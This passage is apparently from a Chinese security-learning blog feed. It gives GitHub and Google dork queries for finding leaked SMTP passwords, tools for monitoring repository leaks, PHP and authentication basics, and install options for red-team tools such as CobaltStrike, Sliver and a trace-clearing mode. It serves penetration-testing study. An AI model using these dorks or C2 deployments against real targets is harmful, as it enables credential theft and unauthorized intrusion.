class="comment">//gitee.com/</span></span><br><span class="line">https:<span class="comment">//github.com/</span></span><br><span class="line">https:<span class="comment">//www.huzhan.com/</span></span><br><span class="line"></span><br><span class="line">GITHUB资源搜索：</span><br><span class="line"><span class="number">1</span>.直接搜索关键字</span><br><span class="line"><span class="number">2</span>.使用下面的语法搜索</span><br><span class="line">in:name test               <span class="comment">#仓库标题搜索含有关键字 </span></span><br><span class="line">in:descripton test         <span class="comment">#仓库描述搜索含有关键字 </span></span><br><span class="line">in:readme test             <span class="comment">#Readme文件搜素含有关键字 </span></span><br><span class="line">stars:&gt;<span class="number">3000</span> test           <span class="comment">#stars数量大于3000的搜索关键字 </span></span><br><span class="line">stars:<span class="number">1000</span>.<span class="number">.3000</span> test      <span class="comment">#stars数量大于1000小于3000的搜索关键字 forks:&gt;1000 test           #forks数量大于1000的搜索关键字 </span></span><br><span class="line">forks:<span class="number">1000</span>.<span class="number">.3000</span> test      <span class="comment">#forks数量大于1000小于3000的搜索关键字 size:&gt;=5000 test           #指定仓库大于5000k(5M)的搜索关键字 pushed:&gt;2019-02-12 test    #发布时间大于2019-02-12的搜索关键字 created:&gt;2019-02-12 test   #创建时间大于2019-02-12的搜索关键字 user:test                  #用户名搜素 </span></span><br><span class="line">license:apache-<span class="number">2.0</span> test    <span class="comment">#明确仓库的 LICENSE 搜索关键字 language:java test         #在java语言的代码中搜索关键字 </span></span><br><span class="line">user:test in:name test     <span class="comment">#组合搜索,用户名test的标题含有test的</span></span><br><span class="line"></span><br><span class="line">关键字配合谷歌搜索：</span><br><span class="line">site:Github.com smtp   </span><br><span class="line">site:Github.com smtp @qq.com   </span><br><span class="line">site:Github.com smtp @<span class="number">126</span>.com   </span><br><span class="line">site:Github.com smtp @<span class="number">163</span>.com   </span><br><span class="line">site:Github.com smtp @sina.com.cn </span><br><span class="line">site:Github.com smtp password </span><br><span class="line">site:Github.com String password smtp</span><br></pre></td></tr></table></figure><p>2、语法固定长期后续监控新泄露</p><ul><li>基于关键字监控</li><li>基于项目规则监控</li></ul><p>防止源代码泄露。<br>下面是三个监控</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">gshark:             https:<span class="comment">//github.com/madneal/gshark               #国人做的系统，非常优秀--</span></span><br><span class="line">    一旦变动，发现关键字，立刻报警</span><br><span class="line">    偏向蓝队</span><br><span class="line"></span><br><span class="line">FireEyeGoldCrystal: https:<span class="comment">//github.com/NHPT/FireEyeGoldCrystal      #</span></span><br><span class="line">    信息收集模式</span><br><span class="line">        根据内置关键词收集存储库：py FireEyeGoldCrystal.py -c</span><br><span class="line">        根据指定关键词文件收集存储库：py FireEyeGoldCrystal.py -c -iF search.txt -sW black.txt</span><br><span class="line">    监控模式</span><br><span class="line">        根据内置关键词监控存储库：py FireEyeGoldCrystal.py -m</span><br><span class="line">        根据指定关键词文件收集存储库，并过滤指定敏感词：py FireEyeGoldCrystal.py -m -iF search.txt -sW black.txt</span><br><span class="line">        根据内置关键词监控存储库，监控阈值为<span class="number">4</span>小时，并输出日志文件：python3 FireEyeGoldCrystal.py -m -mT <span class="number">240</span> &gt;fegc.log</span><br><span class="line"></span><br><span class="line">Github-Monitor:     https:<span class="comment">//github.com/Explorer1092/Github-Monitor  #实时监控</span></span><br></pre></td></tr></table></figure><h1 id="网盘资源搜索-全局文件机密"><a href="#网盘资源搜索-全局文件机密" class="headerlink" title="网盘资源搜索-全局文件机密"></a>网盘资源搜索-全局文件机密</h1><p>主要就是查看网盘中是否存有目标的敏感文件(赌运气)<br>如：企业招标，人员信息，业务产品，应用源码等</p><h1 id="敏感目录文件-目录扫描-amp-爬虫"><a href="#敏感目录文件-目录扫描-amp-爬虫" class="headerlink" title="敏感目录文件-目录扫描&amp;爬虫"></a>敏感目录文件-目录扫描&amp;爬虫</h1><ul><li>后续会详细讲到各类工具项目</li><li>前面提到过一些，比如御剑。适用于无路由网站。(老旧的)</li></ul><h1 id="网络空间进阶-证书-amp-图标-amp-邮箱"><a href="#网络空间进阶-证书-amp-图标-amp-邮箱" class="headerlink" title="网络空间进阶-证书&amp;图标&amp;邮箱"></a>网络空间进阶-证书&amp;图标&amp;邮箱</h1><ul><li>证书资产</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fofa quake hunter</span><br><span class="line">证书语法：</span><br><span class="line">cert:<span class="string">&quot;uestc.edu.cn&quot;</span> <span class="comment"># 里面放证书</span></span><br></pre></td></tr></table></figure><ul><li>ICO资产</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fofa quake hunter</span><br><span class="line">图标也是可以下载下来，放在网络空间上进行搜索的</span><br></pre></td></tr></table></figure><ul><li>邮箱资产</li></ul><p><a href="https://hunter.io/">https://hunter.io/</a></p><h1 id="实战案例四则-技术分享打击方位"><a href="#实战案例四则-技术分享打击方位" class="headerlink" title="实战案例四则-技术分享打击方位"></a>实战案例四则-技术分享打击方位</h1><p>案例1–招标平台二级跳<br>案例2–爱企查隐藏的惊喜<br>案例3–邮箱爆破到内网<br>案例4–不靠系统漏洞，从外网获取域控</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0025</title>
      <link href="/2023/04/09/SEC-Study-0025/"/>
      <url>/2023/04/09/SEC-Study-0025/</url>
      
        <content type="html"><![CDATA[<p>安全开发</p><span id="more"></span><h1 id="基础开发配置"><a href="#基础开发配置" class="headerlink" title="基础开发配置"></a>基础开发配置</h1><h2 id="开发环境："><a href="#开发环境：" class="headerlink" title="开发环境："></a>开发环境：</h2><p>DW + PHPStorm + PhpStudy + Navicat Premium<br>DW : HTML&amp;JS&amp;CSS开发<br>PHPStorm : 专业PHP开发IDE<br>PhpStudy ：Apache MYSQL环境(方便)<br>Navicat Premium: 全能数据库管理工具</p><h2 id="数据导入-mysql架构-amp-库表列"><a href="#数据导入-mysql架构-amp-库表列" class="headerlink" title="数据导入-mysql架构&amp;库表列"></a>数据导入-mysql架构&amp;库表列</h2><p>1、数据库名，数据库表名，数据库列名<br>2、数据库数据，格式类型，长度，键等</p><h2 id="数据库操作-mysqli函数-amp-增删改查"><a href="#数据库操作-mysqli函数-amp-增删改查" class="headerlink" title="数据库操作-mysqli函数&amp;增删改查"></a>数据库操作-mysqli函数&amp;增删改查</h2><p>PHP函数：连接，选择，执行，结果，关闭等</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">参考：https:<span class="comment">//www.runoob.com/php/php-ref-mysqli.html</span></span><br><span class="line">常用：</span><br><span class="line"><span class="title function_ invoke__">mysqli_connect</span>()打开一个到MySQL的新的连接。</span><br><span class="line"><span class="title function_ invoke__">mysqli_select_db</span>()更改连接的默认数据库。</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>()    执行某个针对数据库的查询。</span><br><span class="line"><span class="title function_ invoke__">mysqli_fetch_row</span>()从结果集中取得一行，并作为枚举数组返回。</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>()    关闭先前打开的数据库连接。</span><br><span class="line"></span><br><span class="line">MYSQL增删改查：</span><br><span class="line">查：select * <span class="keyword">from</span> 表名 where 列名=<span class="string">&#x27;条件&#x27;</span>;</span><br><span class="line">增：insert into 表名(`列名<span class="number">1</span>`, `列名<span class="number">2</span>`) <span class="title function_ invoke__">value</span>(<span class="string">&#x27;列1值1&#x27;</span>, <span class="string">&#x27;列2值2&#x27;</span>);</span><br><span class="line">删：delete <span class="keyword">from</span> 表名 where 列名 = <span class="string">&#x27;条件&#x27;</span>;</span><br><span class="line">改：update 表名 set 列名 = 数据 where 列名 = <span class="string">&#x27;条件&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="数据接收输出-html混编-amp-超全局变量"><a href="#数据接收输出-html混编-amp-超全局变量" class="headerlink" title="数据接收输出-html混编&amp;超全局变量"></a>数据接收输出-html混编&amp;超全局变量</h2><p>1、html混编：使HTML(JS)在PHP语言中运行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&#x27;</span>x<span class="string">&#x27;);&lt;/script&gt;&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>2、超全局变量：<br>参考：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//www.w3school.com.cn/php/php_superglobals.asp</span></span><br><span class="line">https:<span class="comment">//www.php.net/manual/zh/language.variables.superglobals.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$GLOBALS</span>：这种全局变量用于在 PHP 脚本中的任意位置访问全局变量</span><br><span class="line"><span class="variable">$_SERVER</span>：这种超全局变量保存关于报头、路径和脚本位置的信息。</span><br><span class="line"><span class="variable">$_REQUEST</span>：<span class="variable">$_REQUEST</span> 用于收集 HTML 表单提交的数据。</span><br><span class="line"><span class="variable">$_POST</span>：广泛用于收集提交method=<span class="string">&quot;post&quot;</span> 的HTML表单后的表单数据。</span><br><span class="line"><span class="variable">$_GET</span>：收集URL中的发送的数据。也可用于收集提交HTML表单数据(method=<span class="string">&quot;get&quot;</span>) <span class="variable">$_FILES</span>：文件上传且处理包含通过HTTP POST方法上传给当前脚本的文件内容。</span><br><span class="line"><span class="variable">$_ENV</span>：是一个包含服务器端环境变量的数组。</span><br><span class="line"><span class="variable">$_COOKIE</span>：是一个关联数组，包含通过cookie传递给当前脚本的内容。</span><br><span class="line"><span class="variable">$_SESSION</span>：是一个关联数组，包含当前脚本中的所有session内容。</span><br></pre></td></tr></table></figure><h2 id="第三方插件引用-js传参-amp-函数对象调用"><a href="#第三方插件引用-js传参-amp-函数对象调用" class="headerlink" title="第三方插件引用-js传参&amp;函数对象调用"></a>第三方插件引用-js传参&amp;函数对象调用</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">引用：&lt;script src=<span class="string">&#x27;../xxx.js&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line">函数对象调用：</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    value : <span class="number">0</span>,</span><br><span class="line">    increment : <span class="function"><span class="keyword">function</span> (<span class="params">inc</span>) </span>&#123;   </span><br><span class="line">        this.value += typeof inc === <span class="string">&#x27;number&#x27;</span> ? inc :<span class="number">1</span>;</span><br><span class="line">        <span class="comment">//设置inc且为数字时 value=inc 反之 value=1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.<span class="title function_ invoke__">increment</span>();</span><br><span class="line">console.<span class="title function_ invoke__">log</span>(obj.value);  <span class="comment">//1</span></span><br><span class="line">obj.<span class="title function_ invoke__">increment</span>(<span class="number">2</span>);</span><br><span class="line">console.<span class="title function_ invoke__">log</span>(obj.value);  <span class="comment">//2</span></span><br></pre></td></tr></table></figure><h1 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h1><h2 id="身份验证-Cookie使用"><a href="#身份验证-Cookie使用" class="headerlink" title="身份验证-Cookie使用"></a>身份验证-Cookie使用</h2><p>生成cookie的原理图过程：<br>1、客户端向服务器发送HTTP请求。<br>2、服务器检查请求头中是否包含cookie信息。<br>3、如果请求头中包含cookie信息，则服务器使用该cookie来识别客户端，否则服务器将生成一个新的cookie。<br>4、服务器在响应头中设置cookie信息并将其发送回客户端。<br>5、客户端接收响应并将cookie保存在本地。<br>6、当客户端发送下一次HTTP请求时，它会将cookie信息附加到请求头中。<br>7、服务器收到请求并检查cookie的有效性。<br>8、如果cookie有效，则服务器响应请求。否则，服务器可能会要求客户端重新登录。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">setcookie(): 设置一个cookie并发送到客户端浏览器。</span><br><span class="line"><span class="built_in">unset</span>(): 用于删除指定的cookie。</span><br></pre></td></tr></table></figure><h2 id="身份验证-Session使用"><a href="#身份验证-Session使用" class="headerlink" title="身份验证-Session使用"></a>身份验证-Session使用</h2><p>1、客户端向服务器发送HTTP请求。<br>2、服务器为客户端生成一个唯一的session ID，并将其存储在服务器端的存储器中（如文件、数据库等）。<br>3、服务器将生成的session ID作为一个cookie发送给客户端。<br>4、客户端将session ID保存为一个cookie，通常是在本地浏览器中存储。<br>5、当客户端在发送下一次HTTP请求时，它会将该cookie信息附加到请求头中，以便服务器可以通过该session ID来识别客户端。<br>6、服务器使用session ID来检索存储在服务器端存储器中的与该客户端相关的session数据，从而在客户端和服务器之间共享数据。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>(): 启动会话，用于开始或恢复一个已经存在的会话。</span><br><span class="line"><span class="variable">$_SESSION</span>: 用于存储和访问当前会话中的所有变量。</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>(): 销毁当前会话中的所有数据。</span><br><span class="line"><span class="title function_ invoke__">session_unset</span>(): 释放当前会话中的所有变量。</span><br><span class="line">Session存储路径：PHP.INI中session.save_path设置路径</span><br></pre></td></tr></table></figure><h2 id="唯一性判断-Token使用"><a href="#唯一性判断-Token使用" class="headerlink" title="唯一性判断-Token使用"></a>唯一性判断-Token使用</h2><p>1、生成Token并将其存储在Session<br>2、生成Token并将其绑定在Cookie触发<br>3、尝试登录表单中带入Token验证逻辑<br>4、思考Token安全特性</p><h2 id="具体安全知识点："><a href="#具体安全知识点：" class="headerlink" title="具体安全知识点："></a>具体安全知识点：</h2><ul><li><p>Cookie和Session都是用来在Web应用程序中跟踪用户状态的机制<br>1、存储位置不同：<br>Cookie是存储在客户端（浏览器）上的，而Session是存储在服务器端的。<br>2、安全性不同：<br>Cookie存储在客户端上，可能会被黑客利用窃取信息，而Session存储在服务器上，更加安全。<br>3、存储容量不同：<br>Cookie的存储容量有限，一般为4KB，而Session的存储容量理论上没有限制，取决于服务器的硬件和配置。<br>4、生命周期不同：<br>Cookie可以设置过期时间，即便关闭浏览器或者重新打开电脑，Cookie仍然存在，直到过期或者被删除。而Session一般默认在浏览器关闭后就会过期。<br>5、访问方式不同：<br>Cookie可以通过JavaScript访问，而Session只能在服务器端进行访问。<br>6、使用场景不同：<br>Cookie一般用于存储小型的数据，如用户的用户名和密码等信息。而Session一般用于存储大型的数据，如购物车、登录状态等信息。<br>总之，Cookie和Session都有各自的优缺点，选择使用哪一种方式，取决于具体的应用场景和需求。一般来说，如果需要存储敏感信息或者数据较大，建议使用Session；如果只需要存储少量的数据，并且需要在客户端进行访问，可以选择使用Cookie。</p></li><li><p>在Web应用程序中，使用token和不使用token的主要差异在于身份验证和安全性。</p></li></ul><p>1.身份验证：采用token机制的Web应用程序，用户在登录成功后会收到一个token，这个token可以在每次请求时发送给服务器进行身份验证。而不采用token机制的Web应用程序，一般会使用session机制来保存用户登录状态，服务器会在用户登录成功后创建一个session，之后的每个请求都需要在HTTP头中附带这个session ID，以便服务器能够验证用户身份。<br>2、安全性：采用token机制的Web应用程序，在服务器上不会存储用户的登录状态，只需要存储token即可。因此，即使token被盗取，黑客也无法获得用户的密码或者其他敏感信息。而不采用token机制的Web应用程序，一般会在服务器上存储用户的登录状态，因此如果服务器被黑客攻击，黑客可能会获得用户的敏感信息。<br>3、跨域访问：采用token机制的Web应用程序，在跨域访问时，可以使用HTTP头中的Authorization字段来传递token信息，方便实现跨域访问。而不采用token机制的Web应用程序，在跨域访问时，需使用cookie或session来传递用户身份信息，比较麻烦。<br>总之，采用token机制可以提高Web应用程序的安全性，并且方便实现跨域访问。不过，使用token机制也需要开发者自己来实现身份验证和token的生成和验证，相对来说比较复杂。而不采用token机制，使用session机制则相对简单，但是安全性相对较低。因此，具体采用哪种机制，需要根据实际情况进行权衡和选择。</p><h2 id="注意：做渗透不是做开发，没必要把开发搞那么细致……"><a href="#注意：做渗透不是做开发，没必要把开发搞那么细致……" class="headerlink" title="注意：做渗透不是做开发，没必要把开发搞那么细致……"></a>注意：做渗透不是做开发，没必要把开发搞那么细致……</h2>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0023</title>
      <link href="/2023/04/08/SEC-Study-0023/"/>
      <url>/2023/04/08/SEC-Study-0023/</url>
      
        <content type="html"><![CDATA[<p>工具集合<br>常识：VIP能查出跟多东西。</p><span id="more"></span><h1 id="各类红蓝队优秀工具项目集合："><a href="#各类红蓝队优秀工具项目集合：" class="headerlink" title="各类红蓝队优秀工具项目集合："></a>各类红蓝队优秀工具项目集合：</h1><blockquote><p><a href="https://github.com/guchangan1/All-Defense-Tool">项目集合</a>：本项目集成了全网优秀的开源攻防武器项目，包含信息收集工具（自动化利用工具、资产发现工具、目录扫描工具、子域名收集工具、指纹识别工具、端口扫描工具、各种插件…），漏洞利用工具（各大CMS利用工具、中间件利用工具等项目…），内网渗透工具（隧道代理、密码提取…）、应急响应工具、甲方运维工具、等其他安全攻防资料整理，供攻防双方使用。如果你有更好的建议，欢迎提出请求。</p></blockquote><h1 id="自动化-武器库部署-F8x"><a href="#自动化-武器库部署-F8x" class="headerlink" title="自动化-武器库部署-F8x"></a>自动化-武器库部署-F8x</h1><p>项目地址：<a href="https://github.com/ffffffff0x/f8x">https://github.com/ffffffff0x/f8x</a><br>1、介绍：<br>一款红/蓝队环境自动化部署工具,支持多种场景,渗透,开发,代理环境,服务可选项等.<br>2、配置：<br>通过 CF Workers 下载 [推荐]<br>wget : wget -O f8x <a href="https://f8x.io/">https://f8x.io/</a><br>curl : curl -o f8x <a href="https://f8x.io/">https://f8x.io/</a><br>3、使用：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">开始</span><br><span class="line"></span><br><span class="line">下载</span><br><span class="line"></span><br><span class="line">    通过CF Workers下载【推荐】</span><br><span class="line">        得到： wget -O f8x https://f8x.io/</span><br><span class="line">        卷曲： curl -o f8x https://f8x.io/</span><br><span class="line"></span><br><span class="line">    github 原始</span><br><span class="line">        得到： wget -O f8x https://raw.githubusercontent.com/ffffffff0x/f8x/main/f8x</span><br><span class="line">        卷曲： curl -o f8x https://raw.githubusercontent.com/ffffffff0x/f8x/main/f8x</span><br><span class="line"></span><br><span class="line">    后续版本不会更新，所以建议不要从releases下载旧版本的f8x。</span><br><span class="line"></span><br><span class="line">用法</span><br><span class="line"></span><br><span class="line">bash f8x -h</span><br><span class="line"></span><br><span class="line">建议加入环境变量</span><br><span class="line"></span><br><span class="line">    得到： wget -O f8x https://f8x.io/ &amp;&amp; <span class="built_in">mv</span> --force f8x /usr/local/bin/f8x &amp;&amp; <span class="built_in">chmod</span> +x /usr/local/bin/f8x</span><br><span class="line">        f8x -h</span><br><span class="line">    卷曲： curl -o f8x https://f8x.io/ &amp;&amp; <span class="built_in">mv</span> --force f8x /usr/local/bin/f8x &amp;&amp; <span class="built_in">chmod</span> +x /usr/local/bin/f8x</span><br><span class="line">        f8x -h</span><br><span class="line"></span><br><span class="line">系统依赖</span><br><span class="line"></span><br><span class="line">f8x 基本上不需要任何依赖，就是帮你安装各种依赖的 😁</span><br><span class="line"></span><br><span class="line">f8x-ctf</span><br><span class="line"></span><br><span class="line">本脚本用于部署CTF环境（Web、Misc、Crypto、Pwn、Iot）</span><br><span class="line"></span><br><span class="line">    得到： wget -O f8x-ctf https://f8x.io/ctf</span><br><span class="line">        bash f8x-ctf -<span class="built_in">help</span></span><br><span class="line">    卷曲： curl -o f8x-ctf https://f8x.io/ctf</span><br><span class="line">        bash f8x-ctf -<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">f8x-dev</span><br><span class="line"></span><br><span class="line">部署中间件、数据库（apache、nginx、tomcat、Database、php）</span><br><span class="line"></span><br><span class="line">    得到： wget -O f8x-dev https://f8x.io/dev</span><br><span class="line">        bash f8x-dev -<span class="built_in">help</span></span><br><span class="line">    卷曲： curl -o f8x-dev https://f8x.io/dev</span><br><span class="line">        bash f8x-dev -<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">选项</span><br><span class="line"></span><br><span class="line">f8x 当前支持以下选项</span><br><span class="line"></span><br><span class="line">批量安装</span><br><span class="line"></span><br><span class="line">    -b：安装基础环境（gcc、make、git、vim、telnet、jq、unzip等基础工具）</span><br><span class="line">    -p：安装代理环境（警告：仅在需要时使用）</span><br><span class="line">    -d: 安装开发环境(python3、pip3、Go、Docker、Docker-Compose、SDKMAN)</span><br><span class="line">    -k ( a/ b/ c/ d/ e）：安装渗透环境（hashcat、ffuf、OneForAll、ksubdomain、impacket等渗透工具）</span><br><span class="line">    -s: 安装蓝队环境 (Fail2Ban、chkrootkit、rkhunter、shellpub)</span><br><span class="line">    -f: 安装其他工具(AdguardTeam、trash-cli、fzf)</span><br><span class="line">    -cloud：安装云应用（Terraform、Serverless Framework、wrangler）</span><br><span class="line">    -all：全自动部署（兼容CentOS7/8,Debain10/9,Ubuntu20/18,Fedora33）</span><br><span class="line"></span><br><span class="line">开发环境</span><br><span class="line"></span><br><span class="line">    -docker: 安装泊坞窗</span><br><span class="line">    -lua: 安装lua</span><br><span class="line">    -nn: 安装 npm &amp; NodeJs</span><br><span class="line">    -go: 安装去</span><br><span class="line">    -oraclejdk(8/11): 安装oraclejdk</span><br><span class="line">    -openjdk: 安装 openjdk</span><br><span class="line">    -py3(7/8/9/10): 安装python3</span><br><span class="line">    -py2: 安装python2</span><br><span class="line">    -pip2-f: force install pip2 (建议-python2选项失败时运行)</span><br><span class="line">    -perl: 安装perl</span><br><span class="line">    -ruby: 安装红宝石</span><br><span class="line">    -rust: 安装锈</span><br><span class="line">    -code: 安装代码服务器</span><br><span class="line">    -chromium: install Chromium (配合rad, crawlergo在-k选项中使用)</span><br><span class="line">    -phantomjs: 安装 PhantomJS</span><br><span class="line"></span><br><span class="line">蓝队服务</span><br><span class="line"></span><br><span class="line">    -binwalk: 安装 binwalk</span><br><span class="line">    -binwalk-f: force install binwalk (建议-binwalk选项失败时运行)</span><br><span class="line">    -clamav: 安装 ClamAV</span><br><span class="line">    -lt：安装LogonTracer（硬件配置要求高）</span><br><span class="line">    -suricata: 安装 Suricata</span><br><span class="line">    -vol: 安装波动</span><br><span class="line">    -vol3: 安装 volatility3</span><br><span class="line"></span><br><span class="line">红队服务</span><br><span class="line"></span><br><span class="line">    -aircrack: 安装 aircrack-ng</span><br><span class="line">    -bypass: 安装旁路</span><br><span class="line">    -goby：安装Goby（客户端需要图形环境，服务器端不需要。）</span><br><span class="line">    -wpscan: 安装 wpscan</span><br><span class="line">    -yakit: 安装燃料</span><br><span class="line"></span><br><span class="line">红队基础设施</span><br><span class="line"></span><br><span class="line">    -awvs14: 安装 AWVS14 (~1.04 GB)</span><br><span class="line">    -cs: 安装 CobaltStrike 4.3</span><br><span class="line">    -cs45: 安装 CobaltStrike 4.5</span><br><span class="line">    -frp: 安装 frp</span><br><span class="line">    -interactsh: 安装 interactsh ( https://github.com/projectdiscovery/interactsh )</span><br><span class="line">    -merlin: 安装 merlin ( https://github.com/Ne0nd0g/merlin )</span><br><span class="line">    -msf: 安装 Metasploit</span><br><span class="line">    -nps: 安装 nps</span><br><span class="line">    -pupy: 安装小狗 ( https://github.com/n1nj4sec/pupy )</span><br><span class="line">    -rg: 安装 RedGuard ( https://github.com/wikiZ/RedGuard )</span><br><span class="line">    -sliver: 安装 sliver-server &amp;&amp; 客户端 ( https://github.com/BishopFox/sliver )</span><br><span class="line">    -sliver-client: 安装 sliver-client</span><br><span class="line">    -sps: 安装 SharPyShell ( https://github.com/antonioCoco/SharPyShell )</span><br><span class="line">    -viper: 安装 Viper (~2.1 GB)</span><br><span class="line"></span><br><span class="line">基于Docker的环境部署</span><br><span class="line"></span><br><span class="line">    -arl: 安装 ARL (~872 MB)</span><br><span class="line">    -mobsf: 安装 MobSF (~1.54 GB)</span><br><span class="line">    -nodejsscan: 安装 nodejsscan (~873 MB)</span><br><span class="line">    -vulhub: 安装 vulhub (~210 MB)</span><br><span class="line">    -vulfocus: 安装 vulfocus (~1.04 GB)</span><br><span class="line">    -TerraformGoat: 安装 TerraformGoat</span><br><span class="line"></span><br><span class="line">杂项服务</span><br><span class="line"></span><br><span class="line">    -asciinema: 安装 asciinema</span><br><span class="line">    -bt : install 宝塔服务</span><br><span class="line">    -clash: 安装 clash ( https://github.com/juewuy/ShellClash )</span><br><span class="line">    -nginx: 安装 nginx</span><br><span class="line">    -ssh：安装ssh（RedHat默认可用，无需重新安装）</span><br><span class="line">    -ssr: 安装ssr</span><br><span class="line">    -zsh: 安装zsh</span><br><span class="line"></span><br><span class="line">其他</span><br><span class="line"></span><br><span class="line">    -clear：清理系统使用痕迹</span><br><span class="line">    -info：查看系统信息</span><br><span class="line">    -optimize：改进设备选项并优化性能</span><br><span class="line">    -remove: 卸载一些vps云监控</span><br><span class="line">    -rmlock：运行解锁模块</span><br><span class="line">    -swap: 配置交换分区</span><br><span class="line">    -update: 更新 f8x</span><br><span class="line">    -upgrade: 升级Pentest工具</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="自动化-网络空间-AsamF"><a href="#自动化-网络空间-AsamF" class="headerlink" title="自动化-网络空间-AsamF"></a>自动化-网络空间-AsamF</h1><p>项目地址：<a href="https://github.com/Kento-Sec/AsamF">https://github.com/Kento-Sec/AsamF</a><br>1、介绍：<br>AsamF集成了Fofa、Hunter、Quake、Zoomeye、Shodan、爱企查、Chinaz、0.zone、subfinder。AsamF支持Fofa、Hunter、Quake、Zoomeye、Shodan、Chinaz、0.zone配置多个Key。<br>2、配置：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AsamF会在~/.config/asamf/目录下生成config.json文件。</span><br><span class="line">如果你有多个key，按照json的格式录入即可，建议键值按照阿拉伯数字依次录入,方便以阿拉伯数字来切换key。自动结果保存在~/asamf/目录下。</span><br><span class="line"></span><br><span class="line">Linux当中如何调用AsamF二进制文件：</span><br><span class="line">示例：调用帮助</span><br><span class="line">./AscamF -h</span><br><span class="line"></span><br><span class="line">遇到的问题：</span><br><span class="line">不断重刷配置文件，导致配置信息全部丢失，暂时没有解决办法。</span><br></pre></td></tr></table></figure><p>3、更多使用：见<a href="https://github.com/Kento-Sec/AsamF">项目文档</a></p><h1 id="自动化-企查信息-ENScan"><a href="#自动化-企查信息-ENScan" class="headerlink" title="自动化-企查信息-ENScan"></a>自动化-企查信息-ENScan</h1><p>项目地址：<a href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a><br>1、介绍：<br>剑指HW/SRC，解决在HW/SRC场景下遇到的各种针对国内企业信息收集难题<br>2、配置：<br>ENScanGo在第一次使用时需要使用-v命令生成配置文件信息后进行配置<br>3、使用：见<a href="https://github.com/wgpsec/ENScan_GO">项目文档</a></p><h1 id="自动化-综合架构-ARL-amp-Nemo"><a href="#自动化-综合架构-ARL-amp-Nemo" class="headerlink" title="自动化-综合架构-ARL&amp;Nemo"></a>自动化-综合架构-ARL&amp;Nemo</h1><h2 id="ARL灯塔"><a href="#ARL灯塔" class="headerlink" title="ARL灯塔"></a>ARL灯塔</h2><p>项目地址：<a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a><br>1、介绍：<br>旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。<br>2、配置：（docker搭建）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">clone</span> https:<span class="comment">//github.com/TophantTechnology/ARL</span></span><br><span class="line">cd ARL/docker/</span><br><span class="line">docker volume create arl_db</span><br><span class="line">docker-compose pull</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>3、使用：见<a href="https://github.com/TophantTechnology/ARL">文档</a></p><h2 id="Nemo-Go-相对来说比较强大"><a href="#Nemo-Go-相对来说比较强大" class="headerlink" title="Nemo_Go(相对来说比较强大)"></a>Nemo_Go(相对来说比较强大)</h2><p>项目地址：<a href="https://github.com/hanc00l/nemo_go">https://github.com/hanc00l/nemo_go</a><br>1、介绍：<br>Nemo是用来进行自动化信息收集的一个简单平台，通过集成常用的信息收集工具和技术，实现对内网及互联网资产信息的自动收集，提高隐患排查和渗透测试的工作效率，用Golang完全重构了原Python版本。<br>快速，大批量信息的处理—没有手工那么多信息。</p><p>2、配置：（docker搭建）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/hanc00l/nemo_go/blob/main/docs/docker.md</span><br><span class="line">下载release的nemo_linux_amd64.tar后执行：</span><br><span class="line"><span class="built_in">mkdir</span> nemo;tar xvf nemo_linux_amd64.tar -C nemo;<span class="built_in">cd</span> nemo</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>3、使用：见直播操作<br>4、Bug：网络空间（配置后要重启）<br>修复bug的办法：nemo/conf/worker.yml =&gt;配置下fofa和quake，再重启。<br>也可能还是解决不了，bug比较多。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0022</title>
      <link href="/2023/04/07/SEC-Study-0022/"/>
      <url>/2023/04/07/SEC-Study-0022/</url>
      
